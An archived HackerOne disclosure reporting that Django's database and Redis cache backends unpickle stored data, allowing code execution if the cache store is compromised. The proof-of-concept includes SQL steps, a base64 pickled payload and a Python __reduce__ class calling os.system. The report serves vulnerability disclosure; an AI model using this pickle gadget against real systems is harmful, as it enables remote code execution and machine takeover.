---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/deserialization-of-untrusted-data
  - env/web
  - stack/python
  - vuln/command-injection
  - vuln/deserialization
  - vuln/broken-access-control
  - vuln/privilege-escalation
  - impact/rce
substate: "informative"
weakness: "Deserialization of Untrusted Data"
enriched: true
body: true
date: 2022-01-14
submitted: 2021-12-02T14:08:15.741Z
bounty_usd: null
votes: 8
cve: "CVE-2021-33026"
program: "[[programs/django|Django]]"
reporter: "scaramouche31"
source: "https://hackerone.com/reports/1415436"
title: "Deserialization of potentially malicious data to RCE"
---
# Deserialization of potentially malicious data to RCE

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 8 | **Program:** Django | **Disclosed:** 2022-01-14

- Report: [https://hackerone.com/reports/1415436](https://hackerone.com/reports/1415436)
- CWE: Deserialization of Untrusted Data | CVE: CVE-2021-33026
- Submitted: 2021-12-02T14:08:15.741Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hello, Django Team! It's my first time working with you, hope it will be great!
Note: I have not seen this issue neither in known vulnerabilities nor in documentation, so here I am.

## Summary
Several type of caches in https://github.com/django/django/tree/main/django/core/cache/backends use python `pickle` which may result in RCE (basically privilege escalation) in case attacker will takeover a machine/container with cache.
So, 4 types of cache use `pickle.load` directly or under the hood:
1. Locmem - I don't consider it as a big issue, because locmem uses some random part of memory for cache taken by Python while the server runs + it is unlikely to be used in production.
2. Filebased - I don't consider it as an issue, because if you control the file with cache, it is likely that you control the machine where Django runs + this behaviour is mentioned in the documentation (https://docs.djangoproject.com/en/3.2/topics/cache/):
```
An attacker who gains access to the cache file can not only falsify HTML content, which your site will trust, but also remotely execute arbitrary code, as the data is serialized using pickle.
```
3. Database - this time I consider this as an issue, because a Django app and db are pretty likely running on different machines/containers. So in case attacker gains access to db, a door to privilege escalation via RCE on other machine is open.
4. Redis - though it was not released yet, it's already supported in dev version from source. Same thoughts here - Redis is likely to run in a separated environment.

## PoC, steps to reproduce:
I'm providing it for a db based cache, as Redis support is not officially released yet if I'm not mistaking
For an ease of PoC I will use sqlite3 on the same machine, but you of course may run a separate database.

1. Create a Django project, make some simple app.
2. Add this to `settings.py`:
```
MIDDLEWARE = [
    'django.middleware.cache.UpdateCacheMiddleware',
    ...
    'django.middleware.cache.FetchFromCacheMiddleware',
]
...
CACHE_MIDDLEWARE_ALIAS = 'default'
CACHE_MIDDLEWARE_KEY_PREFIX = ''
...
CACHES = {
    'default': {
        'BACKEND': 'django.core.cache.backends.db.DatabaseCache',
        'LOCATION': 'my_cache_table',
    }
}
```
3. Run the server, visit your app's page to create a cache entry;
4. In your shell run:
`sqlite3 db.sqlite3`
5. Run `SELECT * FROM my_cache_table;` to find a row which stores the cached page (it was the second one in my case).
6. Run `UPDATE my_cache_table SET value = 'gASVHgAAAAAAAACMAm9zlIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=' where rowid=2;` with the id of your row,
7. Reload the web page.
8. Observe command execution in the server logs.

Video PoC:
{F1532035}

`gASVHgAAAAAAAACMAm9zlIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=` is a base64 version of pickled RCE payload:
```
class Pwner:
    def __reduce__(self):
        import os
        cmd = "whoami"
        return os.system, (cmd,)
```

## Reference
As a reference I'm leaving a very same issue in Flask: 
https://vulmon.com/vulnerabilitydetails?qid=CVE-2021-33026&scoretype=cvssv2

## Attack scenario:
1. Attacker gains an access to machine/container with cache instance.
2. Attacker now can run arbitrary code on machine with running Django server.

## Impact

RCE, full machine takeover

## Timeline

- **Report Filed**
- **2021-12-02** @scaramouche31: I'm currently thinking about possible remediation and will come up with it soon. I can release it, in case you find it appropriate.
- **Report Informative**
- **2021-12-02** @scaramouche31: Also I'm adding a zip with my PoC project
- **Agreed On Going Public**
- **2021-12-02** @scaramouche31: @timgraham 
Ok, thank you for the fast response!
- **Manually Disclosed**
